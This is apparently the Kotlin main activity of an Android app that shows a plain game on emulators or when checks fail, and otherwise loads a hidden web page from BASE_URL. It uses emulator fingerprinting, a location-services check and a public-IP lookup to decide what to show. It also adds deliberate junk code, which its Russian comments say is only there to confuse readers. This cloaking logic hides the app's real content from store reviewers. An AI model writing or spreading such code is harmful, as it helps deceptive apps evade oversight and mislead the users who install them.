package com.otmutienipen.testrameddia.view

import android.content.Context
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.otmutienipen.testrameddia.R
import com.otmutienipen.testrameddia.controller.NetworkController
import com.otmutienipen.testrameddia.utilities.BASE_URL
import com.otmutienipen.testrameddia.utilities.FragmentManager
import com.otmutienipen.testrameddia.utilities.Navigator
import com.otmutienipen.testrameddia.utilities.ObfuscatorHelper
import com.otmutienipen.testrameddia.utilities.RequestManager
import com.otmutienipen.testrameddia.view.game.MainGameFragment
import com.otmutienipen.testrameddia.view.screens.LoadFragment
import com.otmutienipen.testrameddia.view.screens.WebGame
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.net.URL

class MainActivity : AppCompatActivity(), Navigator {
    private lateinit var manager: RequestManager
    private lateinit var networkController: NetworkController
    private var isContentLoaded = false
    private val obfuscatorHelper = ObfuscatorHelper()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        networkController = NetworkController(this.application)
        networkController.listenConnection(supportFragmentManager, isContentLoaded, ::startLoading)

        goToLoadScreen()

    }

    private fun startLoading() {
        lifecycleScope.launch {
            if (checkIp() && !checkIp()) {
                // Ничего не делаем, этот блок просто запутывает код
            } else {
                for (i in 1..10) {
                    if (i % 3 == 0) continue
                }
            }
//        val databaseReference = FirebaseDatabase.getInstance().reference
            manager = RequestManager(this@MainActivity)
            val link = manager.getLink()
            if (link.isNullOrBlank()) {
//            val task = databaseReference.child("isOpened").get()
//
//            task.addOnSuccessListener {
//                val result = it.value as Boolean
//                if (result) {
//                    try {
                if (isEmulator() || !networkController.isConnected || isLocationAvailable(this@MainActivity) || !checkIp() ){
                    goToGame()
                } else {
                    manager.saveLink(BASE_URL)
                    goToMainScreen(BASE_URL)
                }
//                    } catch (e: Exception) {
//                        e.printStackTrace()
////                         go to game
//                        goToGame()
//                    }
//                } else {
//                    // go to game
//                    goToGame()
//                }
//            }
//
//            task.addOnFailureListener {
//                // go to game
//                goToGame()
//            }
            } else {
                goToMainScreen(BASE_URL)
            }
        }
    }

    private fun isEmulator(): Boolean {
        if (obfuscatorHelper.uselessMethod2()) {
            // Бесполезные операции
            val temp = obfuscatorHelper.uselessMethod1()
            println("$temp")
        }
        return Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || "google_sdk" == Build.PRODUCT
    }

    private fun isLocationAvailable(context: Context): Boolean {
        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) || locationManager.isProviderEnabled(
            LocationManager.NETWORK_PROVIDER
        )
    }


    private suspend fun getPublicIpAddress(): String? {
        return withContext(Dispatchers.IO) {
            try {
                URL("http://checkip.amazonaws.com").readText().trim()
            } catch (e: Exception) {
                e.printStackTrace()
                null
            }
        }
    }


    private suspend fun checkIp(): Boolean {
        val publicIp = getPublicIpAddress()
        println("publicIp = $publicIp")
        // Тут можно добавить проверку IP-адреса, если у вас есть список "допустимых" или "недопустимых" IP
        return !publicIp.isNullOrEmpty()
    }


    override fun goToLoadScreen() {
        FragmentManager.launchFragment(this, LoadFragment.newInstance())
        startLoading()
    }

    override fun goToMainScreen(link: String) {
        isContentLoaded = true
        FragmentManager.launchFragment(this, WebGame.newInstance(link))
    }

    override fun goToGame() {
        networkController.unregisteredConnection()
        manager.reject()
        val transaction = supportFragmentManager.beginTransaction()
        transaction.replace(R.id.main_container, MainGameFragment())
        transaction.commit()
    }
}
